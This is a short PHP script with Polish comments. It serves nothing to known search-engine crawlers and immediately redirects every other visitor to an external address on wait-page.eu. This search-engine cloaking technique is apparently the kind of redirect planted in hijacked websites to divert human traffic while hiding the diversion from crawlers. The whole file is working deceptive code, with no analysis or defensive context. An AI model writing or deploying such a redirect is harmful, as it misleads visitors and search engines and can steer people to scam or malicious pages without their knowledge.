<?php
$bots = [
    'Googlebot',
    'Bingbot',
    'Slurp',
    'DuckDuckBot',
    'Baiduspider',
    'YandexBot',
    'Sogou',
    'Exabot',
    'facebot',
    'ia_archiver'
];

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

foreach ($bots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        // Bot zostaje na stronie
        exit;
    }
}

// Przekierowanie dla użytkownika – bez opóźnienia
header("Location: https://wait-page.eu/a/05JMfgn3SDy1K");
exit;
?>

